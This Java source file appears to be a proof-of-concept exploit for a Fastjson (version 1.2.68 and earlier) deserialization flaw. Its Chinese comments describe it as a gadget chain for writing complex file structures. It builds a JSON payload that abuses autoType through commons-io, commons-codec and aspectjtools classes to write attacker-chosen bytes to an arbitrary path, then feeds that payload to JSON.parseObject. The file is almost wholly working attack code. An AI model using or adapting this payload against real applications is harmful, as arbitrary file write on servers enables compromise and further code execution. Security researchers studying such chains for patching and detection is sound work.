package test;
import java.util.Base64;
import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;
import com.alibaba.fastjson.JSON;

public class Fastjson08_io_write_4 {
    public static void main(String[] args) throws Exception {
    	//<=1.2.68 and commons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6
    	//这条链主要是为了解决1-3的io链无法写入复杂文件结构，文件依旧需要大于8kb才能写入
    	String url = "file:///D:/Downloads/1.txt";
    	InputStream input = new URL(url).openStream();
    	byte[] bs = new byte[input.available()];
    	input.read(bs);
    	String test = Base64.getEncoder().encodeToString(bs);
    	byte[] testbs = test.getBytes();
    	String payload = "{\r\n"
    			+ "  \"@type\":\"java.lang.AutoCloseable\",\r\n"
    			+ "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\r\n"
    			+ "  \"delegate\":{\r\n"
    			+ "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
    			+ "    \"input\":{\r\n"
    			+ "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\r\n"
    			+ "      \"in\":{\r\n"
    			+ "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\r\n"
    			+ "        \"charset\":\"utf-8\",\r\n"
    			+ "        \"bufferSize\": 1024,\r\n"
    			+ "        \"s\":{\"@type\":\"java.lang.String\"\""+test+"\"\r\n"
    			+ "      },\r\n"
    			+ "      \"doEncode\":false,\r\n"
    			+ "      \"lineLength\":1024,\r\n"
    			+ "      \"lineSeparator\":\"5ZWKCg==\",\r\n"
    			+ "      \"decodingPolicy\":0\r\n"
    			+ "    },\r\n"
    			+ "    \"branch\":{\r\n"
    			+ "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\r\n"
    			+ "      \"targetPath\":\"./1.txt\"\r\n"
    			+ "    },\r\n"
    			+ "    \"closeBranch\":true\r\n"
    			+ "  },\r\n"
    			+ "  \"include\":true,\r\n"
    			+ "  \"boms\":[{\r\n"
    			+ "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
    			+ "                  \"charsetName\": \"UTF-8\",\r\n"
    			+ "                  \"bytes\":"+Arrays.toString(testbs)+"\r\n"
    			+ "                }],\r\n"
    			+ "  \"x\":{\"$ref\":\"$.bOM\"}\r\n"
    			+ "}\r\n"
    			+ "";

    	System.out.println(payload);
        JSON.parseObject(payload);
        
    }
}
